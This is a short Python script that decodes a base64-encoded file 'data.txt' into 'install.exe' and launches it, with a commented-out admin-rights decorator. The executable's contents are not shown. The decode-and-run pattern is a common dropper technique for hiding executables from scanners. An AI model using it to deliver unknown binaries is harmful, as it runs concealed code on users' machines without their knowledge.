from pathlib import Path
import base64
import os

cr = Path(__file__).resolve().parent


# @main_requires_admin
def main1():
    os.startfile(str(cr.joinpath("install.exe")))


def main():
    d = cr.joinpath("data.txt").read_text(encoding="ascii")
    decoded_binary_data = base64.b64decode(d)
    cr.joinpath("install.exe").write_bytes(decoded_binary_data)


def main2():
    main()
    main1()


if __name__ == "__main__":
    main2()
